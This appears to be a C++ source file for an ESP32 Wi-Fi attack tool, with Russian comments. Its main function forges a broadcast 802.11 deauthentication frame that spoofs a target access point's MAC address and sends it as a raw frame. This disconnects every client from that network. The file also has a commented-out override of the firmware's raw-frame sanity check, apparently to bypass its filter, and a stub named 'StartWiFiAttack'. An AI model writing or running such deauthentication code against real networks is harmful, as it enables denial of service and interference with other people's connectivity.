// #pragma once
#include <Arduino.h>
#include <esp_wifi.h>
#include <string.h>


// extern "C" int ieee80211_raw_frame_sanity_check(uint8_t *frame, int len) {
//   return 0;
// }

void wsl_bypass_init() {
  // 
}

// Отправка широковещательного деаут-кадра
esp_err_t wifi_send_broadcast_deauth(const uint8_t *ap_mac, uint16_t reason_code) {
  uint8_t frame[26];
  const uint8_t broadcast[] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};

  // Frame Control
  frame[0] = 0xC0; // Type: Management, Subtype: Deauthentication
  frame[1] = 0x00;

  // Duration
  frame[2] = 0x00;
  frame[3] = 0x00;

  // MAC addresses
  memcpy(&frame[4],  broadcast, 6);   // Destination (broadcast)
  memcpy(&frame[10], ap_mac,    6);   // Source (AP)
  memcpy(&frame[16], ap_mac,    6);   // BSSID (AP)

  // Sequence control
  frame[22] = 0x00;
  frame[23] = 0x00;

  // Reason code
  frame[24] = reason_code & 0xFF;
  frame[25] = (reason_code >> 8) & 0xFF;

  // Отправка 802.11 raw-кадра
  return esp_wifi_80211_tx(WIFI_IF_STA, frame, sizeof(frame), true);
}














// void StartWiFiAttack() {
//     Serial.println("Hello World");
//     tft.fillScreen(TFT_BLACK);
//     tft.setCursor(10, 10);
//     tft.setTextColor(TFT_GREEN, TFT_BLACK);
//     tft.println("Hello World");
//     delay(1000);
//     drawMenu(); 
// }

// void WiFiScanner () {
//     // 
// }